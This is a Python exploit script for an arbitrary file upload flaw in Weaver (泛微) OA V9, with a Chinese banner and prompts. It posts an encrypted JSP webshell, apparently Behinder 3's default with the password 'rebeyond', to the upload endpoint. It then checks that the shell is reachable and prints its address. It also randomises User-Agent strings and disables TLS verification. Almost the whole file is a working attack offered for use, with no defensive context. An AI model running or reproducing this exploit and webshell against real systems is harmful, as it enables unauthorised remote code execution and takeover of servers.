#encoding: utf-8
import requests
import sys
from time import time
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mVersion: 泛微OA V9 任意文件上传                                             \033[0m')
    print('+  \033[36m使用格式:  python3 exp.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

#随机ua
def get_ua():
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
        '(Macintosh; Intel Mac OS X 10_12_6)'
    ]
    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                  )
    return ua


def POC_1(target_url):
    vuln_url_2 = target_url + "/page/exportImport/uploadOperation.jsp"
    print('\033[36m[+] 正在请求: {}'.format(vuln_url_2))
    headers = {
        "User-Agent": get_ua(),
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc",
        "Connection": "close",
        "Content-Length": "500"
    }
    files = {
        'file': ('update.jsp','<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);out.print(666);}%><%out.print(666);%>','application/octet-stream')
    }
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    response = requests.post(url=vuln_url_2, headers=headers, files=files, verify=False,timeout=10)
    test_webshell(target_url)


def test_webshell(target_url):
    webshell_url = target_url + "/page/exportImport/fileTransfer/update.jsp"
    headers = {"User-Agent": get_ua()}
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=webshell_url, timeout=10, verify=False, headers=headers)
        print("\033[32m[+] 正在请求 : {}/page/exportImport/fileTransfer/update.jsp\033[0m".format(target_url))
        if '666' in response.text and response.status_code == 200:
            print("\033[32m[+] 目标 {} 成功上传 webshell : {}/page/exportImport/fileTransfer/update.jsp\033[0m".format(target_url,target_url))
            print("\033[32m[+] webshell地址：{}/page/exportImport/fileTransfer/update.jsp \033[0m".format(target_url))
            print("\033[32m[+] 冰蝎3默认马 pass ：rebeyond \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标漏洞无法利用，写入失败 \033[0m")
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 目标漏洞无法利用，写入失败 {} \033[0m".format(e))
        sys.exit(0)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35m请输入需要测试的url地址：\033[0m"))
    POC_1(target_url)
